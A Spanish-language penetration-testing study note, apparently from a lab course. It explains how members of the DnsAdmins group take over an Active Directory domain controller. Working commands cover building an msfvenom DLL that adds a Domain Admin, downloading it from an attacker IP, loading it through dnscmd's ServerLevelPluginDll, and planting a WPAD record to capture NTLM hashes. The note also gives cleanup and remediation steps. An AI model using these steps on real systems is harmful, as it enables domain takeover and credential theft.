tags:
___
## 🧠 Concepto clave
Los miembros del grupo **DnsAdmins** tienen acceso a la información DNS de la red y pueden configurar el servicio DNS de Windows para cargar DLLs personalizadas. Dado que el servicio DNS corre como `NT AUTHORITY\SYSTEM`, esto permite a un miembro de este grupo escalar privilegios a SYSTEM en un Domain Controller — o en cualquier servidor que actúe como DNS del dominio. 📄 [DnsAdmins — Microsoft Docs](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#dnsadmins)

| Concepto | Qué es | Riesgo |
|---|---|---|
| **DnsAdmins** | Grupo built-in que otorga permisos de administración sobre el servicio DNS del dominio | Permite cargar una DLL maliciosa en el proceso DNS (SYSTEM), lo que equivale a ejecución de código como SYSTEM en el DC |
| **ServerLevelPluginDll** | Clave de registro que especifica la ruta de una DLL que el servicio DNS cargará al iniciarse | Si un miembro de DnsAdmins la configura con una DLL maliciosa, obtiene ejecución de código como SYSTEM en el próximo reinicio del servicio |
| **WPAD (Web Proxy Auto-Discovery)** | Protocolo que permite a los equipos descubrir automáticamente su configuración de proxy | Si se crea un registro WPAD malicioso en DNS, todo el tráfico de los equipos del dominio puede redirigirse al atacante para capturar hashes o realizar ataques SMBRelay |

## 📌 Puntos importantes

### Cómo funciona el ataque

El servicio DNS de Windows soporta plugins DLL personalizados para resolver consultas. La gestión del DNS se realiza sobre RPC, y la utilidad nativa `dnscmd` permite a los miembros de DnsAdmins configurar la clave de registro `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` con la ruta de una DLL — **sin ninguna verificación de la ruta ni de la firma del archivo**. Cuando el servicio DNS se reinicia, carga y ejecuta esa DLL en el contexto de SYSTEM. 📄 [Abusing DnsAdmins — labofapenetrationtester](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) — 📄 [ADSecurity — DnsAdmins](https://adsecurity.org/?p=4064)

> ⚠️ **Acción destructiva** — Modificar la configuración del DNS y reiniciar el servicio en un Domain Controller puede tumbar el DNS de todo el entorno de Active Directory. Este ataque **solo debe ejecutarse con permiso explícito del cliente** y coordinándolo con ellos.

### Alternativa — mimilib.dll

En lugar de generar una DLL con msfvenom, se puede usar **mimilib.dll** del propio creador de Mimikatz, modificando el archivo `kdns.c` para ejecutar cualquier comando — una reverse shell, añadir un usuario administrador, etc. La DLL se compila con el comando deseado en la función `kdns_DnsPluginQuery`. 📄 [mimilib — gentilkiwi](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) — 📄 [kdns.c — gentilkiwi](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c)

### Alternativa — Ataque WPAD

Los miembros de DnsAdmins también pueden deshabilitar la **global query block list** — una protección que por defecto bloquea la creación de registros DNS para protocolos vulnerables como WPAD e ISATAP. Al deshabilitarla y crear un registro WPAD apuntando a la máquina atacante, todos los equipos del dominio con configuración WPAD por defecto redirigirán su tráfico a través del atacante. Herramientas como **Responder** 📄 [Responder](https://github.com/lgandx/Responder) o **Inveigh** 📄 [Inveigh](https://github.com/Kevin-Robertson/Inveigh) pueden entonces capturar hashes NTLMv2 para crackearlos offline o realizar ataques SMBRelay.

---

### Flujo de explotación — DLL Injection en el servicio DNS

**Paso 1 — Generar la DLL maliciosa con msfvenom**

En este ejemplo, la DLL añade el usuario `netadm` al grupo Domain Admins directamente:

> [!tip] Generar una DLL maliciosa que añade un usuario a Domain Admins
> ```bash
> msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
> ```
> `-p windows/x64/exec` — Payload que ejecuta un comando arbitrario en sistemas Windows x64.
> `cmd='...'` — Comando a ejecutar cuando la DLL sea cargada por el servicio DNS.
> `-f dll` — Formato de salida como DLL de Windows.
> `-o adduser.dll` — Nombre del archivo DLL generado.

**Paso 2 — Servir la DLL desde la máquina atacante**

> [!tip] Levantar un servidor HTTP para transferir la DLL al objetivo
> ```bash
> python3 -m http.server 7777
> ```
> `-m http.server` — Módulo de Python que levanta un servidor HTTP estático en el directorio actual.
> `7777` — Puerto en el que escuchará el servidor.

**Paso 3 — Descargar la DLL en el sistema objetivo**

> [!tip] Descargar la DLL maliciosa en el sistema objetivo
> ```powershell
> wget "http://10.10.14.3:7777/adduser.dll" -outfile "adduser.dll"
> ```
> `"http://10.10.14.3:7777/adduser.dll"` — URL del servidor HTTP atacante donde está alojada la DLL.
> `-outfile "adduser.dll"` — Nombre con el que se guardará el archivo descargado.

**Paso 4 — Confirmar membresía en DnsAdmins**

> [!tip] Verificar membresía en el grupo DnsAdmins
> ```powershell
> Get-ADGroupMember -Identity DnsAdmins
> ```
> `-Identity DnsAdmins` — Nombre del grupo a consultar. Devuelve todos los miembros actuales con su DN, nombre y SID.

**Paso 5 — Cargar la DLL maliciosa con dnscmd** 📄 [dnscmd — Microsoft Docs](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)

Solo los miembros de DnsAdmins pueden ejecutar este comando correctamente — un usuario sin privilegios recibirá `ERROR_ACCESS_DENIED`. Es importante especificar la **ruta completa** a la DLL, de lo contrario el ataque no funcionará.

> [!tip] Configurar la clave ServerLevelPluginDll para cargar la DLL maliciosa
> ```cmd
> dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
> ```
> `/config` — Modifica la configuración del servidor DNS.
> `/serverlevelplugindll` — Especifica la ruta de la DLL que cargará el servicio DNS al iniciarse. Escribe directamente en la clave de registro `HKLM\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll`.
> `C:\Users\netadm\Desktop\adduser.dll` — Ruta completa y absoluta a la DLL maliciosa. Debe ser accesible por la cuenta de máquina del DC.

**Paso 6 — Verificar permisos sobre el servicio DNS y reiniciarlo**

Primero se obtiene el SID del usuario actual para comprobar sus permisos sobre el servicio:

> [!tip] Obtener el SID del usuario actual
> ```cmd
> wmic useraccount where name="netadm" get sid
> ```
> `where name="netadm"` — Filtra por el nombre de usuario del que se quiere obtener el SID.
> `get sid` — Devuelve únicamente el campo SID de la cuenta.

> [!tip] Comprobar los permisos del usuario sobre el servicio DNS
> ```cmd
> sc.exe sdshow DNS
> ```
> `sdshow DNS` — Muestra el Security Descriptor del servicio DNS en formato SDDL. Los permisos `RPWP` en la entrada del SID del usuario indican `SERVICE_START` y `SERVICE_STOP` respectivamente. 📄 [Ver permisos de servicios — winhelponline](https://www.winhelponline.com/blog/view-edit-service-permissions-windows/)

> [!tip] Detener e iniciar el servicio DNS para cargar la DLL maliciosa
> ```cmd
> sc stop dns
> sc start dns
> ```
> `sc stop dns` — Detiene el servicio DNS. El servicio intentará parar correctamente.
> `sc start dns` — Inicia el servicio DNS, momento en el que cargará la DLL configurada en `ServerLevelPluginDll` y ejecutará su código como SYSTEM.

**Paso 7 — Confirmar que el ataque funcionó**

> [!tip] Verificar que el usuario fue añadido al grupo Domain Admins
> ```cmd
> net group "Domain Admins" /dom
> ```
> `/dom` — Consulta el grupo en el contexto del dominio en lugar de solo localmente.

> [!important] El cambio de membresía en Domain Admins **no tendrá efecto en la sesión actual**. Los grupos de un usuario se asignan en el momento del login y no se actualizan dinámicamente. Para que los nuevos privilegios sean efectivos, es necesario generar una nueva sesión o usar `runas` para abrir un proceso en el contexto actualizado:
> ```cmd
> runas /user:INLANEFREIGHT\netadm cmd
> ```
> `runas` — Lanza un proceso en el contexto de seguridad de otro usuario, generando un nuevo token con la membresía de grupos actualizada.
> `/user:INLANEFREIGHT\netadm` — Usuario con el que se abrirá la nueva sesión, que ya tendrá el token de Domain Admin reflejado.
> `cmd` — Proceso a lanzar con el nuevo contexto de seguridad.

---

### Limpieza post-explotación

Tras confirmar el éxito del ataque, es **obligatorio** revertir los cambios para restaurar el servicio DNS correctamente. Estos pasos requieren una consola elevada con cuenta de admin local o de dominio.

> [!tip] Confirmar que la clave de registro maliciosa existe
> ```cmd
> reg query \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
> ```
> `\\10.129.43.9` — IP del Domain Controller donde se realizó el ataque.
> `reg query` — Consulta el contenido de la clave de registro especificada. Debe aparecer `ServerLevelPluginDll` apuntando a la DLL maliciosa.

> [!tip] Eliminar la clave de registro ServerLevelPluginDll
> ```cmd
> reg delete \\10.129.43.9\HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
> ```
> `/v ServerLevelPluginDll` — Especifica el valor concreto a eliminar dentro de la clave de registro.

> [!tip] Reiniciar el servicio DNS y verificar que funciona correctamente
> ```cmd
> sc.exe start dns
> sc query dns
> ```
> `sc.exe start dns` — Inicia el servicio DNS, que ahora arrancará limpiamente sin la DLL maliciosa.
> `sc query dns` — Muestra el estado actual del servicio. Debe aparecer como `RUNNING`.

---

### Flujo de explotación — Ataque WPAD

> [!tip] Deshabilitar la global query block list para permitir registros WPAD
> ```powershell
> Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
> ```
> `-Enable $false` — Deshabilita la lista de bloqueo global, permitiendo crear registros para protocolos como WPAD e ISATAP.
> `-ComputerName dc01.inlanefreight.local` — DC sobre el que se aplica el cambio. 📄 [Set-DnsServerGlobalQueryBlockList — Microsoft Docs](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps)

> [!tip] Crear un registro DNS WPAD apuntando a la máquina atacante
> ```powershell
> Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
> ```
> `-Name wpad` — Nombre del registro DNS a crear. Los equipos buscarán automáticamente este hostname para configurar su proxy.
> `-ZoneName inlanefreight.local` — Zona DNS del dominio donde se añade el registro.
> `-ComputerName dc01.inlanefreight.local` — DC que aloja la zona DNS.
> `-IPv4Address 10.10.14.3` — IP de la máquina atacante a la que se redirigirá el tráfico WPAD.

---

## 🔗 Relaciones / Contexto

El ataque a través de **DnsAdmins** es especialmente relevante porque el grupo suele tener miembros que no son Domain Admins pero que tienen efectivamente el mismo nivel de acceso al DC a través de este vector. La DLL injection sobre el servicio DNS es una de las formas más directas de obtener ejecución de código como SYSTEM en un DC sin explotar ninguna vulnerabilidad — simplemente abusando de una funcionalidad legítima. El ataque WPAD complementa esto al permitir capturar credenciales de toda la red de forma pasiva. Ambos vectores deben documentarse detalladamente en el informe final y el cliente debe revocar membresías innecesarias en este grupo.